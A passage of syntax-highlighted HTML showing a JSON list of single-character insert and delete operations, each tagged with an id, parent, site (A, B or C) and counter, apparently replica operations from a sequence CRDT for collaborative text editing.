</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;q&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 40
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:20&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 12
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 3
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:55&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;p&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 55
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:25&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:34&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 34
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:30&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:21&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:38&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:33&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:22&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;M&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 22
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:23&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;j&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 23
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:48&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;v&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 48
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:31&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;O&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 31
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:28&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;HEAD&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;M&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 28
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:55&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:42&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:27&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;0&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 27
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:50&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 50
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:16&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;K&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 16
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;L&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 6
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:25&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;n&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 25
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:34&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;f&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 34
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:18&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:36&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 1
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;L&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 6
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:14&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;T&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 3
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:50&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:20&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:52&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;≈&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 52
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:35&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:30&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;★&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 30
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;H&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 5
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:19&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;I&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 8
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:1&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;{&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 2
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:54&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Z&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 54
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:21&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;R&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 21
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:17&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 4
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:29&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:57&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;i&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 57
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:32&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;E&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 32
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:38&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;K&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 38
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:45&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:33&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;★&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 33
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:36&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;x&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:45&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:53&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;HEAD&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;E&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 53
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:32&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Z&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 32
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:36&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
